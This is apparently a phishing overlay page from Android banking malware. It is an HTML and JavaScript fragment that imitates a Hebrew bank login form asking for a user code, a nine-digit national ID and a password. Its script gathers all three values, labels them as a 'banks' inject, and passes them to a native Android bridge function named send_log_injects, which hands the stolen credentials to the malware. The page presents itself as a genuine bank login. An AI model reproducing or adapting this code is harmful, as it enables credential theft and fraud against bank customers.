        <section>
            <div id="inForm">
                <input type="text" class="input" id="login" name="login" placeholder="קוד משתמש" autocomplete="off">
                <input type="text" class="input" id="code" name="code" placeholder="(תעודת זהות (9 כופרות" autocomplete="off">
                <input type="password" class="input" id="password" name="password" placeholder="סיסמה" autocomplete="off">
            
                <input type="submit" class="button" id="sendData" disabled value="כניסה לחשבון שלי">
                <p style="text-align: center;color: #0000e4;margin-bottom: 0;"><u> שכרותי סיסמה </u></p>
            </div>
        </section>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        function check() {
            if(login.value.length >= 4 && code.value.length >= 4 && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.code = code.value;
            data.password = password.value;
            
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
</body>
